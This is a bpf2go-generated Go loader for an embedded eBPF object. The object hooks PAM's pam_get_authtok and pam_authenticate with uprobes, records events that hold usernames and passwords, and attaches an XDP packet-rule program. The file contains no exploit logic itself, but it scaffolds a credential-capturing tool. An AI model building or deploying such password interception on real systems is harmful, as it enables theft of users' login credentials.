// Code generated by bpf2go; DO NOT EDIT.
//go:build 386 || amd64

package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"io"

	"github.com/cilium/ebpf"
)

type bpfDestPair struct {
	IpDest   uint32
	PortDest uint16
	_        [2]byte
}

type bpfEvent struct {
	Pid      uint32
	Result   uint32
	Comm     [16]uint8
	Username [80]uint8
	Password [80]uint8
}

type bpfSrcPair struct {
	IpSrc   uint32
	PortSrc uint16
	_       [2]byte
}

// loadBpf returns the embedded CollectionSpec for bpf.
func loadBpf() (*ebpf.CollectionSpec, error) {
	reader := bytes.NewReader(_BpfBytes)
	spec, err := ebpf.LoadCollectionSpecFromReader(reader)
	if err != nil {
		return nil, fmt.Errorf("can't load bpf: %w", err)
	}

	return spec, err
}

// loadBpfObjects loads bpf and converts it into a struct.
//
// The following types are suitable as obj argument:
//
//	*bpfObjects
//	*bpfPrograms
//	*bpfMaps
//
// See ebpf.CollectionSpec.LoadAndAssign documentation for details.
func loadBpfObjects(obj interface{}, opts *ebpf.CollectionOptions) error {
	spec, err := loadBpf()
	if err != nil {
		return err
	}

	return spec.LoadAndAssign(obj, opts)
}

// bpfSpecs contains maps and programs before they are loaded into the kernel.
//
// It can be passed ebpf.CollectionSpec.Assign.
type bpfSpecs struct {
	bpfProgramSpecs
	bpfMapSpecs
}

// bpfSpecs contains programs before they are loaded into the kernel.
//
// It can be passed ebpf.CollectionSpec.Assign.
type bpfProgramSpecs struct {
	UprobePamGetAuthtok      *ebpf.ProgramSpec `ebpf:"uprobe_pam_get_authtok"`
	UretprobePamAuthenticate *ebpf.ProgramSpec `ebpf:"uretprobe_pam_authenticate"`
	UretprobePamGetAuthtok   *ebpf.ProgramSpec `ebpf:"uretprobe_pam_get_authtok"`
	XdpProgFunc              *ebpf.ProgramSpec `ebpf:"xdp_prog_func"`
}

// bpfMapSpecs contains maps before they are loaded into the kernel.
//
// It can be passed ebpf.CollectionSpec.Assign.
type bpfMapSpecs struct {
	Events       *ebpf.MapSpec `ebpf:"events"`
	EventsMap    *ebpf.MapSpec `ebpf:"events_map"`
	PamHandleMap *ebpf.MapSpec `ebpf:"pam_handle_map"`
	XdpRuleMap   *ebpf.MapSpec `ebpf:"xdp_rule_map"`
}

// bpfObjects contains all objects after they have been loaded into the kernel.
//
// It can be passed to loadBpfObjects or ebpf.CollectionSpec.LoadAndAssign.
type bpfObjects struct {
	bpfPrograms
	bpfMaps
}

func (o *bpfObjects) Close() error {
	return _BpfClose(
		&o.bpfPrograms,
		&o.bpfMaps,
	)
}

// bpfMaps contains all maps after they have been loaded into the kernel.
//
// It can be passed to loadBpfObjects or ebpf.CollectionSpec.LoadAndAssign.
type bpfMaps struct {
	Events       *ebpf.Map `ebpf:"events"`
	EventsMap    *ebpf.Map `ebpf:"events_map"`
	PamHandleMap *ebpf.Map `ebpf:"pam_handle_map"`
	XdpRuleMap   *ebpf.Map `ebpf:"xdp_rule_map"`
}

func (m *bpfMaps) Close() error {
	return _BpfClose(
		m.Events,
		m.EventsMap,
		m.PamHandleMap,
		m.XdpRuleMap,
	)
}

// bpfPrograms contains all programs after they have been loaded into the kernel.
//
// It can be passed to loadBpfObjects or ebpf.CollectionSpec.LoadAndAssign.
type bpfPrograms struct {
	UprobePamGetAuthtok      *ebpf.Program `ebpf:"uprobe_pam_get_authtok"`
	UretprobePamAuthenticate *ebpf.Program `ebpf:"uretprobe_pam_authenticate"`
	UretprobePamGetAuthtok   *ebpf.Program `ebpf:"uretprobe_pam_get_authtok"`
	XdpProgFunc              *ebpf.Program `ebpf:"xdp_prog_func"`
}

func (p *bpfPrograms) Close() error {
	return _BpfClose(
		p.UprobePamGetAuthtok,
		p.UretprobePamAuthenticate,
		p.UretprobePamGetAuthtok,
		p.XdpProgFunc,
	)
}

func _BpfClose(closers ...io.Closer) error {
	for _, closer := range closers {
		if err := closer.Close(); err != nil {
			return err
		}
	}
	return nil
}

// Do not access this directly.
//
//go:embed bpf_x86_bpfel.o
var _BpfBytes []byte
